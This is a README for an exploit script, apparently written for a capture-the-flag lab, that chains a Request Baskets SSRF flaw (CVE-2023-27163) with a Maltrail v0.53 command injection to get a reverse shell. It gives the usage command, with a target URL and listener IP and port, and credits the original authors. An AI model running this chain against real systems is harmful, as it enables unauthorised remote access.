# Automatic Exploit

## Summary

The following exploit abuses [**Requests Baskets v1.2.1 SSRF vulnerability**](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) to forward the internal application running at `127.0.0.1:80` to the external application at `/pwned`. Once the **Mailtrail v0.53** application has been forwarded it will execute a reverse shell command against it and within a few seconds the user should obtain a reverse shell onto the machine.

## Command

```
python3 ./exploit http://10.10.10.10:55555 LISTENER-IP LISTENER-PORT
```

## Exploits:
* CVE-2023-27163
* Mailtrail v0.53

## Credits
* https://github.com/overgrowncarrot1
* https://github.com/spookier/Maltrail-v0.53-Exploit
